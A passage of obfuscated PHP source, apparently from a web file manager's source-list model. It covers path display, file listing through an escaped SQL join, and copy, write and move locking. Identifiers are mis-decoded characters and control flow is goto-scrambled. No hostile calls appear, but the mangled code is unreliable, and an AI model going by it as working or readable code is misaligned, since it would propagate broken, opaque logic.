=> $Cîî≈úœµÏ) { goto Dúô’Û»ß•; Dúô’Û»ß•: if (!isset($eâñ∆’áîº[$Cîî≈úœµÏ])) { continue; } $E≤‚¢Ê∞ÙÙ = $eâñ∆’áîº[$Cîî≈úœµÏ]; $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[499]] = $E≤‚¢Ê∞ÙÙ; goto CË·üüô Ÿ; dëÀ»‡ÛÖí: for ($D◊ﬂÙ∏ª°± = 0; $D◊ﬂÙ∏ª°± < $A”ö∂°¶ô‹; $D◊ﬂÙ∏ª°±++) { if (!isset($aµ¬Ö∞çÇï[$e°ó◊û¢∆[$D◊ﬂÙ∏ª°±]])) { $f¿¿¥Œ”◊≤ = $BÍ–ÿÁÁŸê[33]; break; } $f¿¿¥Œ”◊≤ = $f¿¿¥Œ”◊≤ . rtrim($aµ¬Ö∞çÇï[$e°ó◊û¢∆[$D◊ﬂÙ∏ª°±]], $BÍ–ÿÁÁŸê[8]) . $BÍ–ÿÁÁŸê[8]; } $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[500]] = rtrim($f¿¿¥Œ”◊≤, $BÍ–ÿÁÁŸê[8]) . $BÍ–ÿÁÁŸê[8]; break; goto C±∆≤î˘é±; CË·üüô Ÿ: if ($E≤‚¢Ê∞ÙÙ[$BÍ–ÿÁÁŸê[433]] != $eÿÜòÙè€“) { $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[408]] = $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[408]] & $E≤‚¢Ê∞ÙÙ[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[407]]; } $f¿¿¥Œ”◊≤ = $BÍ–ÿÁÁŸê[33]; $A”ö∂°¶ô‹ = count($e°ó◊û¢∆) - $EÈ®¢ÃıÒå; goto dëÀ»‡ÛÖí; C±∆≤î˘é±: } } unset($D◊àà≠äû”); goto e≤˘æÖÛ€⁄; e≤˘æÖÛ€⁄: } public function groupPathDisplay(&$dÆÂ„î∫Ó) { goto aêöëÿÉΩÓ; aêöëÿÉΩÓ: $BÜ¨∞¬üƒÎ =& $_SERVER[™⁄»üÆ]; if ($dÆÂ„î∫Ó[$BÜ¨∞¬üƒÎ[405]] != self::TYPE_GROUP) { return; } $cêåßéÕªä = Model($BÜ¨∞¬üƒÎ[504])->getInfo($dÆÂ„î∫Ó[$BÜ¨∞¬üƒÎ[485]]); goto AŸÂ’åèƒÔ; Bœêü∫≥Ò◊: $dÆÂ„î∫Ó[$BÜ¨∞¬üƒÎ[505]] = $cêåßéÕªä[$BÜ¨∞¬üƒÎ[479]]; $dÆÂ„î∫Ó[$BÜ¨∞¬üƒÎ[506]] = $cêåßéÕªä[$BÜ¨∞¬üƒÎ[503]]; $dÆÂ„î∫Ó[$BÜ¨∞¬üƒÎ[507]] = $cêåßéÕªä[$BÜ¨∞¬üƒÎ[508]]; goto DË•’çºˆç; DË•’çºˆç: $dÆÂ„î∫Ó[$BÜ¨∞¬üƒÎ[509]] = $EãÓÌ∞Ú—æ . $cêåßéÕªä[$BÜ¨∞¬üƒÎ[85]][$BÜ¨∞¬üƒÎ[396]]; goto DÁ©âö™´ö; AŸÂ’åèƒÔ: $C´ûìúÀï° = $this->parentLevelArray($cêåßéÕªä[$BÜ¨∞¬üƒÎ[503]]); $EãÓÌ∞Ú—æ = $BÜ¨∞¬üƒÎ[33]; foreach ($C´ûìúÀï° as $dÁé˜‡¿¢ì) { $aﬂ«ì°„ÿÕ = Model($BÜ¨∞¬üƒÎ[504])->getInfo($dÁé˜‡¿¢ì); $EãÓÌ∞Ú—æ .= $aﬂ«ì°„ÿÕ[$BÜ¨∞¬üƒÎ[85]][$BÜ¨∞¬üƒÎ[396]] . $BÜ¨∞¬üƒÎ[47]; } goto Bœêü∫≥Ò◊; DÁ©âö™´ö: } protected function _listAppendPath(&$EÜÒÓ»Ω·†, $cı≥ÓêÃœˆ = false) { goto D∂çííßÈ; eÜ«∂êÚÈ›: $f≠¥“Ê˘ƒº = array(); if ($cı≥ÓêÃœˆ) { return $búòèöÁêñ; } foreach ($EÜÒÓ»Ω·† as &$F§Ú‡ÖùÜ·) { goto E§èâ⁄€è∫; E§èâ⁄€è∫: $däÕô›ΩÇê = $F§Ú‡ÖùÜ·[$F¿ê¢πë°å[396]]; if ($F§Ú‡ÖùÜ·[$F¿ê¢πë°å[404]] == $F¿ê¢πë°å[87] && $F§Ú‡ÖùÜ·[$F¿ê¢πë°å[479]] != 0) { $búòèöÁêñ[$däÕô›ΩÇê] = $F§Ú‡ÖùÜ·[$F¿ê¢πë°å[28]]; } if ($F§Ú‡ÖùÜ·[$F¿ê¢πë°å[404]] == $F¿ê¢πë°å[87] && $F§Ú‡ÖùÜ·[$F¿ê¢πë°å[479]] == 0 && !isset($búòèöÁêñ[$däÕô›ΩÇê])) { $búòèöÁêñ[$däÕô›ΩÇê] = $this->_listAppendPathRoot($F§Ú‡ÖùÜ·, array()); } goto CÊÛÈ√Ñöµ; d°Í≥«˜∏¥: foreach ($Cì∞ñÛπï∞ as $eöËã∫òòﬂ => $BÕ™◊°ö˘) { if (isset($búòèöÁêñ[$BÕ™◊°ö˘])) { continue; } if ($eöËã∫òòﬂ == 0) { $búòèöÁêñ[$BÕ™◊°ö˘] = $this->_listAppendPathRoot($F§Ú‡ÖùÜ·, $Cì∞ñÛπï∞); } if ($eöËã∫òòﬂ != 0) { $FÛÆ¬À¥Ÿ©[] = $BÕ™◊°ö˘; } } goto eË‹¶ÔÈ∏€; CÊÛÈ√Ñöµ: if (isset($f≠¥“Ê˘ƒº[$F§Ú‡ÖùÜ·[$F¿ê¢πë°å[503]]])) { continue; } $f≠¥“Ê˘ƒº[$F§Ú‡ÖùÜ·[$F¿ê¢πë°å[503]]] = !0; $Cì∞ñÛπï∞ = $this->parentLevelArray($F§Ú‡ÖùÜ·[$F¿ê¢πë°å[503]]); goto d°Í≥«˜∏¥; eË‹¶ÔÈ∏€: } goto BÔ∞ΩúÃï; D∂çííßÈ: $F¿ê¢πë°å =& $_SERVER[™⁄»üÆ]; static $búòèöÁêñ = array(); $FÛÆ¬À¥Ÿ© = array(); goto eÜ«∂êÚÈ›; BÔ∞ΩúÃï: unset($F§Ú‡ÖùÜ·); $FÛÆ¬À¥Ÿ© = array_unique($FÛÆ¬À¥Ÿ©); if (count($FÛÆ¬À¥Ÿ©) > 0) { $c’√˜Á£¥´ = array($F¿ê¢πë°å[411] => array($F¿ê¢πë°å[412], $FÛÆ¬À¥Ÿ©)); if (count($FÛÆ¬À¥Ÿ©) == 1) { $c–∑Î°πÀÆ = $this->sourceInfo($FÛÆ¬À¥Ÿ©[0]); $f¢Á≥áç’Ú = is_array($c–∑Î°πÀÆ) ? array($c–∑Î°πÀÆ) : !1; } else { $f¢Á≥áç’Ú = $this->field($F¿ê¢πë°å[510])->where($c’√˜Á£¥´)->select(); } if (!$f¢Á≥áç’Ú) { $f¢Á≥áç’Ú = array(); } foreach ($f¢Á≥áç’Ú as $Fπ‚‹•Âã‚) { $búòèöÁêñ[$Fπ‚‹•Âã‚[$F¿ê¢πë°å[396]]] = $Fπ‚‹•Âã‚[$F¿ê¢πë°å[28]]; } } goto Bàù„Œ»Óâ; b≤¶ùêœ¿—: unset($F§Ú‡ÖùÜ·); return $EÜÒÓ»Ω·†; goto e“ÖºÜ¨é; Bàù„Œ»Óâ: $dï‡π∫≤∏¶ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Fî™Û–ÑÛÜ = array(); foreach ($EÜÒÓ»Ω·† as &$F§Ú‡ÖùÜ·) { goto EÓ†º¶◊áã; bß§ŸÖûÇà: if ($F§Ú‡ÖùÜ·[$F¿ê¢πë°å[479]] == $F¿ê¢πë°å[191]) { $F§Ú‡ÖùÜ·[$F¿ê¢πë°å[28]] = trim($búòèöÁêñ[$F§Ú‡ÖùÜ·[$F¿ê¢πë°å[396]]], $F¿ê¢πë°å[8]); } if (intval($F§Ú‡ÖùÜ·[$F¿ê¢πë°å[405]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($F§Ú‡ÖùÜ·, $Cì∞ñÛπï∞, $dï‡π∫≤∏¶); } goto DîºîŒÜñ; EÓ†º¶◊áã: $C±ıìÑ€µÉ = $F§Ú‡ÖùÜ·[$F¿ê¢πë°å[503]]; $aâÂâπÿøœ = $F¿ê¢πë°å[33]; if (isset($Fî™Û–ÑÛÜ[$C±ıìÑ€µÉ])) { $aâÂâπÿøœ = $Fî™Û–ÑÛÜ[$C±ıìÑ€µÉ]; } else { $Cì∞ñÛπï∞ = $this->parentLevelArray($F§Ú‡ÖùÜ·[$F¿ê¢πë°å[503]]); foreach ($Cì∞ñÛπï∞ as $eöËã∫òòﬂ => $BÕ™◊°ö˘) { if (isset($búòèöÁêñ[$BÕ™◊°ö˘])) { $aâÂâπÿøœ .= $búòèöÁêñ[$BÕ™◊°ö˘] . $F¿ê¢πë°å[8]; } } $Fî™Û–ÑÛÜ[$C±ıìÑ€µÉ] = $aâÂâπÿøœ; } goto CùÖ¶∑¥Á; CùÖ¶∑¥Á: $aâÂâπÿøœ .= $F§Ú‡ÖùÜ·[$F¿ê¢πë°å[28]]; if ($F§Ú‡ÖùÜ·[$F¿ê¢πë°å[404]] == $F¿ê¢πë°å[87]) { $aâÂâπÿøœ .= $F¿ê¢πë°å[8]; } $F§Ú‡ÖùÜ·[$F¿ê¢πë°å[501]] = str_replace($F¿ê¢πë°å[511], $F¿ê¢πë°å[8], $aâÂâπÿøœ); goto bß§ŸÖûÇà; DîºîŒÜñ: } goto b≤¶ùêœ¿—; e“ÖºÜ¨é: } private function _listAppendPathRecycle(&$E‹ÉãÔ‹™õ, $FÑ≥‹ÿˆÔ , $eÓüÁøÎ¨˜) { goto cŸõ®≥≤éÜ; dõåçá •˘: if ($E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[396]] == $eÓüÁøÎ¨˜) { $E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[503]] = $aÿ©ÖôŸêÌ[513]; $E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[479]] = $aÿ©ÖôŸêÌ[191]; $E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[28]] = LNG($aÿ©ÖôŸêÌ[512]); } $E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[514]] = $aÿ©ÖôŸêÌ[515]; goto EˆÎË∆Ê‡¬; cŸõ®≥≤éÜ: $aÿ©ÖôŸêÌ =& $_SERVER[™⁄»üÆ]; if (!in_array($eÓüÁøÎ¨˜, $FÑ≥‹ÿˆÔ ) && $E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[396]] != $eÓüÁøÎ¨˜) { return; } $Cåçôπë∫Â = explode($aÿ©ÖôŸêÌ[8], trim($E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[501]], $aÿ©ÖôŸêÌ[8])); goto Cä∞èÉß»Î; Cä∞èÉß»Î: $bØœóÌ≤ãÁ = implode($aÿ©ÖôŸêÌ[8], array_slice($Cåçôπë∫Â, 2)); $E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[501]] = $aÿ©ÖôŸêÌ[8] . LNG($aÿ©ÖôŸêÌ[512]) . $aÿ©ÖôŸêÌ[8] . ltrim($bØœóÌ≤ãÁ, $aÿ©ÖôŸêÌ[8]); $E‹ÉãÔ‹™õ[$aÿ©ÖôŸêÌ[503]] = $aÿ©ÖôŸêÌ[513] . implode($aÿ©ÖôŸêÌ[47], array_slice($FÑ≥‹ÿˆÔ , 1)) . $aÿ©ÖôŸêÌ[47]; goto dõåçá •˘; EˆÎË∆Ê‡¬: } protected function _listAppendPathRoot(&$aÕ¡œ⁄⁄Úã, $C¡ ∆„î∞˜) { $F’óê¡Ë«Ë =& $_SERVER[™⁄»üÆ]; $D‘»Ñ‘≤ü— = $F’óê¡Ë«Ë[33]; if ($aÕ¡œ⁄⁄Úã[$F’óê¡Ë«Ë[405]] == self::TYPE_USER) { if (defined($F’óê¡Ë«Ë[455]) && $aÕ¡œ⁄⁄Úã[$F’óê¡Ë«Ë[485]] == USER_ID) { $D‘»Ñ‘≤ü— = LNG($F’óê¡Ë«Ë[516]); if (!$C¡ ∆„î∞˜) { $aÕ¡œ⁄⁄Úã[$F’óê¡Ë«Ë[28]] = $D‘»Ñ‘≤ü—; } } else { $fÂ≤£‹πãÕ = Model($F’óê¡Ë«Ë[495])->getInfoSimple($aÕ¡œ⁄⁄Úã[$F’óê¡Ë«Ë[485]]); $D‘»Ñ‘≤ü— = LNG($F’óê¡Ë«Ë[517]) . $F’óê¡Ë«Ë[160] . $fÂ≤£‹πãÕ[$F’óê¡Ë«Ë[28]] . $F’óê¡Ë«Ë[518]; } } else { if ($aÕ¡œ⁄⁄Úã[$F’óê¡Ë«Ë[405]] == self::TYPE_GROUP) { $fÂ≤£‹πãÕ = Model($F’óê¡Ë«Ë[504])->getInfoSimple($aÕ¡œ⁄⁄Úã[$F’óê¡Ë«Ë[485]]); $D‘»Ñ‘≤ü— = $fÂ≤£‹πãÕ[$F’óê¡Ë«Ë[28]]; } else { if ($aÕ¡œ⁄⁄Úã[$F’óê¡Ë«Ë[405]] == self::TYPE_SYSTEM) { $D‘»Ñ‘≤ü— = $F’óê¡Ë«Ë[519]; } } } $D‘»Ñ‘≤ü— = $D‘»Ñ‘≤ü— ? $F’óê¡Ë«Ë[8] . $D‘»Ñ‘≤ü— . $F’óê¡Ë«Ë[8] : $F’óê¡Ë«Ë[8]; return $D‘»Ñ‘≤ü—; } protected function _listAppendUser(&$aîß‹©ïòÇ) { goto Fº«ÏçœˆŸ; aÖ”Ÿä∑§É: $Aæ∫•Ìáß¥ = array_merge($EŒ–ÒÊãÎë, $b–êû„‰Ú∆); $eºº‹¢ﬂˆ∏ = Model($aﬁÑèÃßßØ[520])->userListInfo($Aæ∫•Ìáß¥); foreach ($aîß‹©ïòÇ as &$AÖ¯∫¡‚ïé) { $bºìÿÏ‹Ç = $AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[433]]; $AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[433]] = $eºº‹¢ﬂˆ∏[$bºìÿÏ‹Ç] ? $eºº‹¢ﬂˆ∏[$bºìÿÏ‹Ç] : !1; $bºìÿÏ‹Ç = $AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[435]]; $AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[435]] = $eºº‹¢ﬂˆ∏[$bºìÿÏ‹Ç] ? $eºº‹¢ﬂˆ∏[$bºìÿÏ‹Ç] : !1; if (isset($AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[446]]) && $AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[446]][$aﬁÑèÃßßØ[521]]) { $e∏ÎÔä÷ıÕ = $GLOBALS[$aﬁÑèÃßßØ[6]][$aﬁÑèÃßßØ[88]][$aﬁÑèÃßßØ[522]]; if ($AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[446]][$aﬁÑèÃßßØ[523]] <= time() - $e∏ÎÔä÷ıÕ) { $this->metaSet($AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[396]], $aﬁÑèÃßßØ[521], null); $this->metaSet($AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[396]], $aﬁÑèÃßßØ[523], null); unset($AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[446]][$aﬁÑèÃßßØ[521]]); continue; } $F¥Àß¢Ÿå⁄ = $AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[446]][$aﬁÑèÃßßØ[521]]; $AÖ¯∫¡‚ïé[$aﬁÑèÃßßØ[446]][$aﬁÑèÃßßØ[524]] = Model($aﬁÑèÃßßØ[520])->getInfoSimpleOuter($F¥Àß¢Ÿå⁄); } } goto a÷Ó¶∞„¬Ë; Fº«ÏçœˆŸ: $aﬁÑèÃßßØ =& $_SERVER[™⁄»üÆ]; $EŒ–ÒÊãÎë = array_to_keyvalue($aîß‹©ïòÇ, $aﬁÑèÃßßØ[33], $aﬁÑèÃßßØ[433]); $b–êû„‰Ú∆ = array_to_keyvalue($aîß‹©ïòÇ, $aﬁÑèÃßßØ[33], $aﬁÑèÃßßØ[435]); goto aÖ”Ÿä∑§É; a÷Ó¶∞„¬Ë: unset($AÖ¯∫¡‚ïé); goto F»‡»µ»ôŒ; F»‡»µ»ôŒ: } public function parentLevelArray($D“ü≠É‹¢ó) { $Dà ≥û¶ìú =& $_SERVER[™⁄»üÆ]; $D“ü≠É‹¢ó = explode($Dà ≥û¶ìú[47], trim($D“ü≠É‹¢ó, $Dà ≥û¶ìú[47])); return array_remove_value($D“ü≠É‹¢ó, $Dà ≥û¶ìú[191]); } public function listAll($cçç¡»ÃÚû) { goto a†¶Ø∫ØÚÕ; dâ∑Ìûï¶À: $this->_listAppendAuth($bå£÷∞àáÉ); $this->_listAppendUser($bå£÷∞àáÉ); $this->_listAppendPath($bå£÷∞àáÉ); goto dóÃ∞≤°∞á; AÇÊ˜⁄ﬁíà: $C„í–Ñã´º = array(); foreach ($bå£÷∞àáÉ as $b∞«—´ã≥º => $bÙ·ÌôÚäØ) { goto a§ãﬁß≤àÉ; a§ãﬁß≤àÉ: $c€ê≠¿êóé = $this->parentLevelArray($bÙ·ÌôÚäØ[$EÆÑ∆Ãéöñ[503]]); array_shift($c€ê≠¿êóé); $f¿øËàÉ’÷ = $Bâê∞œåÿÜ; goto aˆ÷¡—πÑµ; aˆ÷¡—πÑµ: for ($c∫ï“œı∫Í = 0; $c∫ï“œı∫Í < count($c€ê≠¿êóé); $c∫ï“œı∫Í++) { $f¿øËàÉ’÷ .= $bå£÷∞àáÉ[$c€ê≠¿êóé[$c∫ï“œı∫Í]][$EÆÑ∆Ãéöñ[28]] . $EÆÑ∆Ãéöñ[8]; } $f¿øËàÉ’÷ .= $bÙ·ÌôÚäØ[$EÆÑ∆Ãéöñ[28]]; if ($bÙ·ÌôÚäØ[$EÆÑ∆Ãéöñ[404]]) { $f¿øËàÉ’÷ .= $EÆÑ∆Ãéöñ[8]; } goto cÉ≈˘∞¡õÜ; Fú‘ñ›—ÿÖ: if (!$bÙ·ÌôÚäØ[$EÆÑ∆Ãéöñ[404]]) { $F“Ïåç†Ωê[$EÆÑ∆Ãéöñ[448]] = $bÙ·ÌôÚäØ[$EÆÑ∆Ãéöñ[448]]; $F“Ïåç†Ωê[$EÆÑ∆Ãéöñ[86]] = $bÙ·ÌôÚäØ[$EÆÑ∆Ãéöñ[76]]; } $C„í–Ñã´º[] = $F“Ïåç†Ωê; goto DûäôºÇÛê; cÉ≈˘∞¡õÜ: $f¿øËàÉ’÷ = str_replace($EÆÑ∆Ãéöñ[511], $EÆÑ∆Ãéöñ[8], $f¿øËàÉ’÷); $f¿øËàÉ’÷ = str_replace($EÆÑ∆Ãéöñ[511], $EÆÑ∆Ãéöñ[8], $f¿øËàÉ’÷); $F“Ïåç†Ωê = array($EÆÑ∆Ãéöñ[415] => str_replace($EÆÑ∆Ãéöñ[511], $EÆÑ∆Ãéöñ[8], $f¿øËàÉ’÷), $EÆÑ∆Ãéöñ[531] => intval($bÙ·ÌôÚäØ[$EÆÑ∆Ãéöñ[404]]), $EÆÑ∆Ãéöñ[85] => $this->pathInfoFilter($bÙ·ÌôÚäØ)); goto Fú‘ñ›—ÿÖ; DûäôºÇÛê: } return $C„í–Ñã´º; goto d˘Õ∏ìúÚî; a†¶Ø∫ØÚÕ: $EÆÑ∆Ãéöñ =& $_SERVER[™⁄»üÆ]; $AÑﬂí∂¬√Ø = $this->sourceInfo($cçç¡»ÃÚû); $c…µ√ø£¨Â = array($EÆÑ∆Ãéöñ[525] => array($EÆÑ∆Ãéöñ[526], $AÑﬂí∂¬√Ø[$EÆÑ∆Ãéöñ[503]] . $cçç¡»ÃÚû . $EÆÑ∆Ãéöñ[527]), $EÆÑ∆Ãéöñ[528] => 0); goto cƒ¨Õ˜†—†; cƒ¨Õ˜†—†: $C•“Ú‹‡±÷ = $EÆÑ∆Ãéöñ[529]; $a™Ô´Öó∆‰ = "\114\x45\x46\x54\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\x5f\x66\151\154\145\40\146\x69\154\145\40\157\156\x20\x73\157\165\x72\x63\145\56\x66\151\154\x65\111\x44\40\x3d\40\146\151\154\145\56\146\x69\x6c\145\x49\104"; $bå£÷∞àáÉ = $this->alias($EÆÑ∆Ãéöñ[530])->field($C•“Ú‹‡±÷)->where($c…µ√ø£¨Â)->join($a™Ô´Öó∆‰)->select(); goto dâ∑Ìûï¶À; dóÃ∞≤°∞á: $bå£÷∞àáÉ = array_to_keyvalue($bå£÷∞àáÉ, $EÆÑ∆Ãéöñ[396]); $Bâê∞œåÿÜ = "\x2f{$AÑﬂí∂¬√Ø[$EÆÑ∆Ãéöñ[28]]}\57"; $Bâê∞œåÿÜ = $Bâê∞œåÿÜ == $EÆÑ∆Ãéöñ[511] ? $EÆÑ∆Ãéöñ[8] : $Bâê∞œåÿÜ; goto AÇÊ˜⁄ﬁíà; d˘Õ∏ìúÚî: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($c°À’ÍÎãÜ) { goto dƒê„Òãáò; D®âøçÿõë: $eëﬁéËãÈ¡ = 1; $this->_lockEvent($c°À’ÍÎãÜ, array($fﬂıéΩ÷≠¯[533], $fﬂıéΩ÷≠¯[534]), $eëﬁéËãÈ¡); $this->_lockParent($c°À’ÍÎãÜ, array($fﬂıéΩ÷≠¯[534]), $eëﬁéËãÈ¡); goto D°ó◊äü¥ù; dƒê„Òãáò: $fﬂıéΩ÷≠¯ =& $_SERVER[™⁄»üÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($fﬂıéΩ÷≠¯[532], $c°À’ÍÎãÜ); goto D®âøçÿõë; D°ó◊äü¥ù: $this->_lockEvent($c°À’ÍÎãÜ, array($fﬂıéΩ÷≠¯[535], $fﬂıéΩ÷≠¯[536]), $eëﬁéËãÈ¡); $this->_lockCheckEnd($fﬂıéΩ÷≠¯[532], $c°À’ÍÎãÜ); goto EÖƒ®ªÊè§; EÖƒ®ªÊè§: } public function lockCopyEnd($f∏…∑ÖŒ¡˘) { $E⁄ö÷÷“πé =& $_SERVER[™⁄»üÆ]; if (!$this->allowLock()) { return; } $BıßÜÍﬂ‚√ = 0; $this->_lockEvent($f∏…∑ÖŒ¡˘, array($E⁄ö÷÷“πé[533], $E⁄ö÷÷“πé[534]), $BıßÜÍﬂ‚√); $this->_lockParent($f∏…∑ÖŒ¡˘, array($E⁄ö÷÷“πé[534]), $BıßÜÍﬂ‚√); $this->_lockEvent($f∏…∑ÖŒ¡˘, array($E⁄ö÷÷“πé[535], $E⁄ö÷÷“πé[536]), $BıßÜÍﬂ‚√); } public function lockWriteStart($e∫Ç„åó’©, $fÿöïé¡Ê‹ = '') { goto AÀ‰‹ôíßÑ; AÀ‰‹ôíßÑ: $b–‹á”á¢ =& $_SERVER[™⁄»üÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($b–‹á”á¢[533], $e∫Ç„åó’©); goto D≤ªáãö´Ÿ; E·∑•â˜ÍΩ: $this->_lockParent($e∫Ç„åó’©, array($b–‹á”á¢[532], $b–‹á”á¢[534]), $EΩﬁÎØÛ˘ç); $this->_lockCheckEnd($b–‹á”á¢[533], $e∫Ç„åó’©); goto Dïùﬂ€≠Êù; D≤ªáãö´Ÿ: $EΩﬁÎØÛ˘ç = 1; $this->_lockKey($b–‹á”á¢[537] . $e∫Ç„åó’© . $b–‹á”á¢[95] . $fÿöïé¡Ê‹, $EΩﬁÎØÛ˘ç); $this->_lockEvent($e∫Ç„åó’©, array($b–‹á”á¢[532], $b–‹á”á¢[534]), $EΩﬁÎØÛ˘ç); goto E·∑•â˜ÍΩ; Dïùﬂ€≠Êù: } public function lockWriteEnd($CòÿÜí◊î±, $Eáâ‚Æà∫§ = '') { $eçÑﬁô—≥” =& $_SERVER[™⁄»üÆ]; if (!$this->allowLock()) { return; } $D¥—Îêõ‘® = 0; $this->_lockKey($eçÑﬁô—≥”[537] . $CòÿÜí◊î± . $eçÑﬁô—≥”[95] . $Eáâ‚Æà∫§, $D¥—Îêõ‘®); $this->_lockEvent($CòÿÜí◊î±, array($eçÑﬁô—≥”[532], $eçÑﬁô—≥”[534]), $D¥—Îêõ‘®); $this->_lockParent($CòÿÜí◊î±, array($eçÑﬁô—≥”[532], $eçÑﬁô—≥”[534]), $D¥—Îêõ‘®); } public function lockMoveStart($D»ªìÑ¯•‡) { goto D™êŒ∑°ÛÃ; eËı∞é„è˘: $eÉÍÌüâå· = 1; $this->_lockKey($D‚…ñÎˆ√œ[538] . $D»ªìÑ¯•‡, $eÉÍÌüâå·); $this->_lockEvent($D»ªìÑ¯•‡, array($D‚…ñÎˆ√œ[532], $D‚…ñÎˆ√œ[533]), $eÉÍÌüâå·); goto E—ûñ›çàÕ; D™êŒ∑°ÛÃ: $D‚…ñÎˆ√œ =& $_SERVER[™⁄»üÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($D‚…ñÎˆ√œ[534], $D»ªìÑ¯•‡); goto eËı∞é„è˘; E—ûñ›çàÕ: $this->_lockParent($D»ªìÑ¯•‡, array($D‚…ñÎˆ√œ[532], $D‚…ñÎˆ√œ[534]), $eÉÍÌüâå·); $this->_lockEvent($D»ªìÑ¯•‡, array($D‚…ñÎˆ√œ[539], $D‚…ñÎˆ√œ[535], $D‚…ñÎˆ√œ[536]), $eÉÍÌüâå·); $this->_lockCheckEnd($D‚…ñÎˆ√œ[534], $D»ªìÑ¯•‡); goto c—≠Ø“Ñ¡´; c—≠Ø“Ñ¡´: } public function lockMoveEnd($EÎ¬ƒè‹ªÜ) { goto fÇŒüÊê¥ô; fÇŒüÊê¥ô: $b£ØÜ∏˜¥π =& $_SERVER[™⁄»üÆ]; if (!$this->allowLock()) { return; } $Fµ›∑Èáëı = 0; goto B£ª›‡ŒÑ›; eﬂç œ„Ùò: $this->_lockEvent($EÎ¬ƒè‹ªÜ, array($b£ØÜ∏˜¥π[539], $b£ØÜ∏˜¥π[535], $b£ØÜ∏˜¥π[536]), $Fµ›∑Èáëı); goto CàåÆØŸ«ñ; B£ª›‡ŒÑ›: $this->_lockKey($b£ØÜ∏˜¥π[538] . $EÎ¬ƒè‹ªÜ, $Fµ›∑Èáëı); $this->_lockEvent($EÎ¬ƒè‹ªÜ, array($b£ØÜ∏˜¥π[532], $b£ØÜ∏˜¥π[533]), $Fµ›∑Èáëı); $this->_lockParent($EÎ¬ƒè‹ªÜ, array($b£ØÜ∏˜¥π[532], $b£ØÜ∏˜¥π[534]), $Fµ›∑Èáëı); goto eﬂç œ„Ùò; CàåÆØŸ«ñ: } private function _lockCheck($e—‚ˆÊÆ´”, $cÒ◊Ò≥ö´Î) { goto fÂüÃØâÆå; cõßË∆áº≈: $a®øÈ≤ôäÍ = array_reverse($this->parentLevelArray($f©Ê˘”À™[$d»‘ﬂŒ®ê˜[503]])); foreach ($a®øÈ≤ôäÍ as $f‰ëÆ…ÃÎ≠) { $d˜˘ÔêÜ¯˘ = $e—‚ˆÊÆ´” . $d»‘ﬂŒ®ê˜[541] . $f‰ëÆ…ÃÎ≠; if (CacheLock::lockGet($d»‘ﬂŒ®ê˜[542] . $d˜˘ÔêÜ¯˘)) { $f©Ê˘”À™ = $this->sourceInfo($f‰ëÆ…ÃÎ≠); CacheLock::setErrorMsg($d»‘ﬂŒ®ê˜[160] . htmlspecialchars($f©Ê˘”À™[$d»‘ﬂŒ®ê˜[28]]) . $d»‘ﬂŒ®ê˜[518] . $d¶î≈€…©∞); $this->_lockKey($d˜˘ÔêÜ¯˘, 1); $this->_lockKey($d˜˘ÔêÜ¯˘, 0); } } goto F®∆¶êßÎª; a•ºæŸ≈ƒÃ: $this->_lockTimeStart[$d˜˘ÔêÜ¯˘] = timeFloat(); if (!is_array($f©Ê˘”À™)) { return; } $d¶î≈€…©∞ = LNG($d»‘ﬂŒ®ê˜[540]); goto Fπ˜ıˆƒïå; fÂüÃØâÆå: $d»‘ﬂŒ®ê˜ =& $_SERVER[™⁄»üÆ]; $f©Ê˘”À™ = $this->sourceInfo($cÒ◊Ò≥ö´Î); $d˜˘ÔêÜ¯˘ = $e—‚ˆÊÆ´” . $d»‘ﬂŒ®ê˜[95] . $cÒ◊Ò≥ö´Î; goto a•ºæŸ≈ƒÃ; Fπ˜ıˆƒïå: CacheLock::setErrorMsg($d»‘ﬂŒ®ê˜[160] . htmlspecialchars($f©Ê˘”À™[$d»‘ﬂŒ®ê˜[28]]) . $d»‘ﬂŒ®ê˜[518] . $d¶î≈€…©∞); $this->_lockKey($d˜˘ÔêÜ¯˘, 1); $this->_lockKey($d˜˘ÔêÜ¯˘, 0); goto cõßË∆áº≈; F®∆¶êßÎª: } private function _lockCheckEnd($EÕ≠ºŒãâ€, $a¶¯∂Ï·óÆ) { goto aΩ≤ú†ñ∏“; aΩ≤ú†ñ∏“: $bº°ﬁŒå¶¡ =& $_SERVER[™⁄»üÆ]; $C‰·»…Ñ≥˘ = $EÕ≠ºŒãâ€ . $bº°ﬁŒå¶¡[95] . $a¶¯∂Ï·óÆ; CacheLock::setErrorMsg($bº°ﬁŒå¶¡[375]); goto dçàÀ∂ˆôΩ; d⁄¿œÑÜ›ú: if ($C¬§Á∑æ—Í > 0.5) { unset(self::$cacheSourceInfo[$bº°ﬁŒå¶¡[439] . 